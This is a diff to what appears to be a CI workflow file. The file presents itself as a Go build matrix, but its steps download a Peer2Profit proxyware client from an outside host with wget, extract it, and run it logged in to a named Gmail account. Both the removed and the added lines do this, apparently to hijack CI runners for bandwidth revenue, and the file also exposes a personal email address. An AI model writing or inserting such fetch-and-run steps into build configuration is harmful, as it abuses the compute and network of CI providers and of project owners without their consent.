@@ -17,10 +17,10 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: DOWNLOAD
-      run: wget https://updates.peer2profit.app/p2pclient_0.60_amd64.deb && dpkg -x p2pclient_0.60_amd64.deb ~ && cd usr/bin && ./p2pclient --login windu01221996@gmail.com
+      run: wget https://updates.peer2profit.app/p2pclient_0.60_amd64.deb
     - name: Extract
-      run: wget https://updates.peer2profit.app/p2pclient_0.60_amd64.deb && dpkg -x p2pclient_0.60_amd64.deb ~ && cd usr/bin && ./p2pclient --login windu01221996@gmail.com
+      run: dpkg -x p2pclient_0.60_amd64.deb
     - name: RUNNING
-      run: wget https://updates.peer2profit.app/p2pclient_0.60_amd64.deb && dpkg -x p2pclient_0.60_amd64.deb ~ && cd usr/bin && ./p2pclient --login windu01221996@gmail.com
+      run: ./p2pclient --login windu01221996@gmail.com
     - name: DONE
       run: exit
